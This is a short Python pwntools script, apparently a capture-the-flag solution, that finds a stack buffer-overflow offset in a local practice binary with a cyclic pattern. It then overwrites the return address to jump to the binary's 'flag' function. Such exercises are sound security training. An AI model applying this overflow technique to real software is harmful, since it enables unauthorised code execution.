from __future__ import print_function

from pwn import *

crash = True
if crash:
    p = gdb.debug('./buf')
    pause()
    p.sendline(cyclic(512))
    pause()
    # run in gdb: x/1x
    sys.exit()

elf = ELF('./buf')

exploit = cyclic(cyclic_find(0x61616167))

exploit += p64(elf.symbols[u'flag'])

p = process('./buf')
p.sendline(exploit)
print(p.recvline(), end='')
